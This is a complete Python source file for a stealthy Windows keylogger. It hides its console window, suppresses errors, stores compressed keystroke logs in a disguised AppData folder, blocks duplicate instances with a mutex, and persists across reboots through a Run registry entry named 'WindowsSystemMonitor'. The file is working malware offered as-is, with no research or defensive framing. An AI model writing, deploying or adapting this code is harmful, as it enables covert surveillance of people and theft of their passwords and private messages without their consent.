import os
import sys
import win32console
import win32gui
import win32event
import win32api
import winerror
import threading
import gzip
from datetime import datetime
from pynput import keyboard

# 1. Suppress all background error messages
sys.stderr = None

# 2. Setup hidden paths in the user's local AppData directory
LOG_DIR = os.path.join(os.environ["LOCALAPPDATA"], "SystemData")
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Changed extension to .gz to represent Gzip compressed archive data
LOG_FILE_PATH = os.path.join(LOG_DIR, "sys_log.dat.gz")

# 3. Completely hide the command prompt window instantly
def hide_window():
    window = win32console.GetConsoleWindow()
    if window:
        win32gui.ShowWindow(window, 0)

timer = threading.Timer(0, hide_window)
timer.start()

# 4. Single-instance protection (Mutex)
mutex = win32event.CreateMutex(None, 1, "BestInClass_Secure_Mutex_v3")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

# 5. Windows Registry Persistence (Survives Restarts)
def ensure_persistence():
    try:
        import winreg
        script_path = os.path.abspath(sys.argv[0])
        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSystemMonitor", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    except Exception:
        pass

ensure_persistence()

# 6. Global variable to monitor formatting state
last_timestamp = None

# 7. Modern Keystroke Capture, Compression, and 3-Hour Timestamped File Logging
def on_press(key):
    global last_timestamp
    current_time = datetime.now()
    log_entry = ""

    # Changed interval to 3 hours (3 hours * 60 minutes * 60 seconds = 10,800 seconds)
    if last_timestamp is None or (current_time - last_timestamp).total_seconds() > 10800:
        timestamp_str = f"\n\n--- [Log Session: {current_time.strftime('%Y-%m-%d %H:%M:%S')}] ---\n"
        log_entry += timestamp_str
        last_timestamp = current_time

    try:
        log_entry += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry += " "
        elif key == keyboard.Key.enter:
            log_entry += "\n"
        elif key == keyboard.Key.backspace:
            log_entry += " [Bck] "
        elif key == keyboard.Key.tab:
            log_entry += " [Tab] "
        else:
            log_entry += f" [{str(key).replace('Key.', '')}] "

    # Instant, non-volatile binary file write using Gzip compression
    try:
        # 'at' mode means Append Text inside a Gzip compressed environment safely
        with gzip.open(LOG_FILE_PATH, "at", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception:
        pass

# 8. Start the modern engine loop
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

